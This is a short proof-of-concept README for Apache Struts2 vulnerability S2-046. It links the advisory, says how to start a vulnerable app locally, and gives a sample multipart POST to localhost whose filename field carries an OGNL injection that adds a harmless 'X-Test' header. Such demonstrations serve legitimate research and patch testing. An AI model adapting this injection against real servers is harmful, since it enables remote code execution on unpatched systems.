# S2-046-PoC

Security Bulletin:
https://cwiki.apache.org/confluence/display/WW/S2-046

More info:
https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#.WNAr_RLyvpR

Start vulnerable application with:
```
mvn jetty:run
```

Sample request:
```
POST /doUpload.action HTTP/1.1
Host: localhost:8080
Content-Length: 1000000000
Cache-Control: max-age=0
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://localhost:8080/doUpload
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close

------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
Content-Type: text/plain


foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--
```
